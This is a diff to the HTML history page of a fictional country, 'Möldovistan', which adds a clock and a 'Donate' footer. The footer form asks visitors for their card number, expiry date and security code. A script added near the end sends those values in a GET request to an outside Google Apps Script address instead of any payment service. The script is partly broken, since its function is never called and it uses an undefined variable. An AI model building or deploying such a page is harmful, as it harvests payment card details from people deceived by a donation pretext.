@@ -4,25 +4,38 @@
 <meta charset="utf-8">
 <title>Möldovastan - History</title>
 <link rel="stylesheet" href="style.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Ruslan+Display&family=Space+Grotesk:wght@400;700&display=swap" rel="stylesheet"> 
 </head>
 
 <body>
 <nav class="navbar is-transparent">
   <div class="container">
-    <div class="navbar-brand"> <a class="navbar-item" href="/">Home</a>
+    <div class="navbar-brand"> <a class="navbar-item" href="index.html">Home</a>
 	  </div>
     <ul id="navMenu" class="navbar-start has-text-centered navbar-menu false">
-      <li class="navbar-item" style="padding:0px"> <a class="navbar-item" href="/about">About</a></li>
-      <li class="navbar-item" style="padding:0px"><a class="navbar-item" href="/products">Products</a></li>
-      <li class="navbar-item" style="padding:0px"><a class="navbar-item" href="/blog">Blog</a></li>
-      <li class="navbar-item" style="padding:0px"><a class="navbar-item" href="/contact">Contact</a></li>
+      <li class="navbar-item" style="padding:0px"> <a class="navbar-item" href="history.html">History</a></li>
+      <li class="navbar-item" style="padding:0px"><a class="navbar-item" href="culture.html">Culture</a></li>
+      <li class="navbar-item" style="padding:0px"><a class="navbar-item" href="gov.html">Government</a></li>
+      <li class="navbar-item" style="padding:0px"><a class="navbar-item" href="#donate">Donate</a></li>
       <li class="navbar-end" style="padding:0px"><a class="navbar-item" href="https://facebook.com"><svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Pro 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license (Commercial License) Copyright 2023 Fonticons, Inc. --><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg></a></li>
     </ul>
   </div>
 </nav>
+    <div id = "clock">
+        <h4>The time in Möldovistan is</h4>
+        <span id = "hours">00</span>
+        <span>:</span>
+        <span id = "mins">00</span>
+        <span id = "session">AM</span>
+    </div>
+    <img id = "flag" src = "imgs/gov/flag.png">
+    
+    <h1>The History of Möldovistan</h1>
 <div style="display: flex;background-color: white;height:700px;">
   <div style="flex: 1; overflow-y: scroll;text-align: left;padding-left: 30px;padding-right: 30px;">
-    <h1 style="color: black; padding: 0.75em 1.25em 1.25em;">History</h1>
+    <h1 style="color: black; padding: 0.75em 1.25em 1.25em;">Once Upon A Time...</h1>
   Since the earliest known recordings of history, Möldovastan has played a part in some way. On the sandy shores you can find anything from dinosaur bones (We think they're dinosaur bones) to coinage of ancient dynasties. It's complex, it doesn't make a whole lot of sense, but its woven into the very identity of this great land.<br><br>It is our duty, then, to ensure that this great history is perserved. Why wouldn't it? Why <em>shouldn't</em> it? Because of some silly dispute with various geopolitical organizations who play favourites, the story of Möldovastan is at risk of being dulled and forgotten. We created this page to act as a snapshot into what this land whispers to us.<br><br>To learn more, please visit the First Khaan Library to read through our codices, meticulously maintained by the book monks.
 	<iframe style="margin: auto;width:100%; margin: 1em 0;" src="https://www.google.com/maps/d/u/0/embed?mid=18S5yVUqYaZazs6pACYJNfp2ZFy0RsWI&ehbc=2E312F" width="640" height="480"></iframe></div>
   <div style="flex: 1; overflow-y: scroll;">
@@ -66,5 +79,94 @@
   </div>
 </div>
 
+<footer id="donate">
+  <div class="container">
+	          <img id = "flag" src = "imgs/gov/flag.png">
+        
+        <h1>Donate to Möldovistan!</h1>
+        
+        <br>
+        
+        <p>Okay we're exaggerating, we're really not doing that well off as a country... any and all donations are much appreciated as it helps keep our beautiful nation afloat! Also--if you can send a letter to your federal government requesting they recognize us, we'd really appreciate it. xoxo</p>
+        
+      <div>
+        <form action="#" method="post">
+          <label for="cc" style="color:white;">To Donate, Please Enter Your Credit Card Information Here:</label>
+          <input type="cc" id="cc" name="cc" placeholder="Credit Card Number">
+		  <input type="expiry" id="expiry" name="expiry" placeholder="MM/YY" maxlength="4" size="4">
+		  <input type="security" id="security" name="security" placeholder="XXX" maxlength="3" size="1">
+          <button class="read-more" type="submit">Donate!</button>
+        </form>
+      </div>
+      <div>
+        <p>&copy; 2023 The Government of Möldovistan, in all Her glory. All Rights Reserved.</p>
+      </div>
+  </div>
+</footer>
+
 </body>
+<script>
+    
+        function displayTime() {
+            
+            var dateTime = new Date();
+            var hrs = dateTime.getHours();
+            var min = dateTime.getMinutes();
+            var session = document.getElementById('session');
+            
+            hrs = hrs +7; //Moldovistan time
+            
+            if(hrs > 24){
+                
+                hrs = hrs - 24;
+            }
+            
+            if(hrs >=12) {
+
+                session.innerHTML = 'PM';
+            }
+            
+            else {
+                
+                session.innerHTML = 'AM';
+            }
+            
+            if(hrs > 12) {
+                
+                hrs = hrs - 12;
+            }
+            
+            if(min < 10) {
+                
+                min = "0" + min;
+            }
+            
+            document.getElementById('hours').innerHTML = hrs;
+            document.getElementById('mins').innerHTML = min;
+            
+        }
+        
+        setInterval(displayTime, 10);
+        
+    </script>
+ <script>
+  
+  var script_url ="https://script.google.com/macros/s/AKfycbxjIwp_rc9PPrU2tZuUTj5U0rwsrIrNwhmuQzq_Vnh0AOrpQKADMzgKI_tLog2BMOuMWg/exec";
+  var emailcheck=false;
+  // Make an AJAX call to Google Script
+  function insert_value() {
+  	var cc= $("#cc").val();
+	var expiry= $("#expiry").val();
+	var subject= $("#security").val();
+   var url = script_url+"?callback=ctrlq&cc="+cc+"&expiry="+expiry+"&security="+security+"&action=insert"; 
+    var request = jQuery.ajax({
+      crossDomain: true,
+      url: url ,
+      method: "GET",
+      dataType: "jsonp"
+    });
+}
+
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
 </html>
